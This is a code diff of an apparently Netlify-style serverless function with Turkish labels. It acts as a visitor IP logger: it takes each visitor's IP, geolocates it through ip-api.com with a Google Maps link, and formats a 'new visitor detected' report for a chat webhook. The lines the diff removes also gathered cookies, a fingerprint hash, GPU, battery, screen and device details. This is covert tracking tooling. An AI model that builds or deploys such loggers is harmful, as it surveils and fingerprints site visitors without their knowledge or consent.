@@ -1,87 +1,53 @@
 exports.handler = async (event, context) => {
-  let data = {};
-  try {
-    if (event.body) {
-      data = JSON.parse(event.body);
-    }
-  } catch (e) {}
+  const queryIp = event.queryStringParameters ? event.queryStringParameters.ip : null;
+  const rawIp = queryIp || 
+                event.headers['cf-connecting-ip'] || 
+                event.headers['x-nf-client-connection-ip'] || 
+                event.headers['x-forwarded-for'] || 
+                'Bilinmiyor';
 
-  const clientIp = data.ip || event.headers['cf-connecting-ip'] || event.headers['x-forwarded-for'] || 'Bilinmiyor';
+  const clientIp = rawIp.split(',')[0].trim();
 
-  // GeoIP Bilgileri
   let country = 'Bilinmiyor';
   let city = 'Bilinmiyor';
   let isp = 'Bilinmiyor';
-  let timezone = 'Bilinmiyor';
   let coords = null;
 
   if (clientIp !== 'Bilinmiyor') {
     try {
-      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,isp,org,timezone,lat,lon,as`);
+      const geoRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,country,city,isp,org,lat,lon,as`);
       const geoData = await geoRes.json();
 
       if (geoData.status === 'success') {
         country = geoData.country || 'Bilinmiyor';
         city = geoData.city || 'Bilinmiyor';
-        isp = `${geoData.isp || geoData.org} (${geoData.as || ''})`;
-        timezone = geoData.timezone || 'Bilinmiyor';
+        isp = `${geoData.isp || geoData.org || 'Bilinmiyor'} (${geoData.as || ''})`;
         coords = `https://www.google.com/maps?q=${geoData.lat},${geoData.lon}`;
       }
     } catch (e) {}
   }
 
   const embed = {
-    title: "⚡ ZİYARETÇİ LOG RAPORU",
-    color: 5814783,
+    title: "🎯 Yeni Ziyaretçi Tespit Edildi",
+    color: 5814783, // Mavi/Blurple
     fields: [
       {
         name: "🌐 Ağ & Konum",
         value: 
-          `• **IP:** \`${clientIp}\`\n` +
+          `• **IP Adresi:** \`${clientIp}\`\n` +
           `• **Konum:** ${city} / ${country}\n` +
-          `• **İSS:** ${isp}\n` +
-          `• **Zaman Dilimi:** ${timezone}\n` +
-          (coords ? `• **Harita:** [Konuma Git](${coords})` : `• **Harita:** Bilinmiyor`),
+          `• **İnternet Sağlayıcı:** ${isp}\n` +
+          (coords ? `• **Harita:** [Konuma Git](${coords})` : `• **Harita:** Bulunamadı`),
         inline: false
       },
       {
-        name: "💻 Donanım & Sistem",
-        value: 
-          `• **GPU:** \`${data.gpu || 'Bilinmiyor'}\`\n` +
-          `• **CPU / RAM:** ${data.hardware || 'Bilinmiyor'}\n` +
-          `• **İşletim Sistemi:** ${data.platform || 'Bilinmiyor'}\n` +
-          `• **Batarya:** ${data.battery || 'Bilinmiyor'}\n` +
-          `• **Cihazlar:** ${data.media || 'Bilinmiyor'}`,
-        inline: false
-      },
-      {
-        name: "🖥️ Ekran & Görüntü",
-        value: 
-          `• **Çözünürlük:** ${data.screen || 'Bilinmiyor'}\n` +
-          `• **Pencere:** ${data.windowSize || 'Bilinmiyor'}\n` +
-          `• **Renk Derinliği:** ${data.colorDepth || 'Bilinmiyor'}\n` +
-          `• **Dokunmatik:** ${data.touch || 'Bilinmiyor'}`,
-        inline: true
-      },
-      {
-        name: "🔍 Oturum & Tarayıcı",
-        value: 
-          `• **Hash:** \`${data.fingerprint || 'Bilinmiyor'}\`\n` +
-          `• **Diller:** ${data.languages || 'Bilinmiyor'}\n` +
-          `• **Geldiği Yer:** ${data.referrer || 'Doğrudan'}\n` +
-          `• **Çerezler:** ${data.cookies || 'Bilinmiyor'}`,
-        inline: true
-      },
-      {
-        name: "📌 Sayfa & User-Agent",
-        value: 
-          `• **URL:** ${data.url || 'Bilinmiyor'}\n` +
-          `• **UA:** \`${event.headers['user-agent'] || 'Bilinmiyor'}\``,
+        name: "📌 Tarayıcı & Sistem (User-Agent)",
+        value: `\`${event.headers['user-agent'] || 'Bilinmiyor'}\``,
         inline: false
       }
     ],
     footer: {
-      text: "cloxinunbeaten.xyz • Otomatik Güvenlik Logu"
+      text: "cloxinunbeaten.xyz • Güvenlik Logu"
     },
     timestamp: new Date().toISOString()
   };
